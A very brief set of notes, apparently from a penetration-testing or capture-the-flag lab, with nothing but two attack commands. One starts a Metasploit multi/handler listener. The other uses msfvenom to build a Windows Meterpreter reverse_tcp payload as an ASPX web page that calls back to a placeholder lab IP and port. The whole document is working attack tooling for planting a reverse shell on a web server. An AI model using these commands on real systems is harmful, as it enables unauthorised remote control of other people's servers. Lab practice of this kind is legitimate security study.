
#### metasploit 
```
 use exploit/multi/handler
```

#### aspx
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > devel.aspx
```

